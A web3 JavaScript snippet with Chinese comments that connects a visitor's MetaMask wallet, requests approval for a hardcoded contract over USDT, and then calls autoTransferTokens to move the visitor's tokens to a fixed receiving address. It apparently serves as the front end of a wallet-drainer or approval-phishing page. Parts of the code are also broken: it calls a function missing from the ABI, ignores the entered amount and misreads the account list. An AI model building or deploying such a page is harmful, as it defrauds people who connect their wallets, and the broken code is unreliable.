const contractAddress = '0xa2E8dda146b9E724bA0cdfB3bdB6bfA1e37a54d2';
const abi = [
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "tokenAddress",
                "type": "address"
            },
            {
                "internalType": "address",
                "name": "from",
                "type": "address"
            },
            {
                "internalType": "address",
                "name": "to",
                "type": "address"
            }
        ],
        "name": "autoTransferTokens",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    // 其他ABI部分...
];

let web3;
let currentAccount;

// 默认接收地址和转移数量
const defaultToAddress = '0xYourReceivingAddress'; // 替换为您希望转移的接收地址
const defaultAmount = '1'; // 替换为您希望转移的数量

document.getElementById('connectButton').addEventListener('click', async () => {
    if (window.ethereum) {
        web3 = new Web3(window.ethereum);
        try {
            await window.ethereum.request({ method: 'eth_requestAccounts' });
            currentAccount = await web3.eth.getAccounts()[0];
            alert(`钱包连接成功: ${currentAccount}`);
            document.getElementById('approveButton').style.display = 'inline-block';
            document.getElementById('transferButton').style.display = 'inline-block';
        } catch (error) {
            alert('连接失败，请检查您的钱包设置！');
        }
    } else {
        alert('请安装MetaMask！');
    }
});

document.getElementById('approveButton').addEventListener('click', async () => {
    const tokenAddress = '0xdac17f958d2ee523a2206206994597c13d831ec7'; // USDT地址
    const amount = prompt("请输入授权数量：");
    const contract = new web3.eth.Contract(abi, contractAddress);
    try {
        await contract.methods.approveForTransfer(tokenAddress, currentAccount, contractAddress).send({ from: currentAccount });
        alert('授权成功！');
    } catch (error) {
        alert('授权失败！');
    }
});

document.getElementById('transferButton').addEventListener('click', async () => {
    const tokenAddress = '0xdac17f958d2ee523a2206206994597c13d831ec7'; // USDT地址
    // 使用默认的接收地址和转移数量
    const toAddress = defaultToAddress; 
    const amount = defaultAmount; 
    const contract = new web3.eth.Contract(abi, contractAddress);
    try {
        await contract.methods.autoTransferTokens(tokenAddress, currentAccount, toAddress).send({ from: currentAccount });
        alert('转移成功！');
    } catch (error) {
        alert('转移失败！');
    }
});
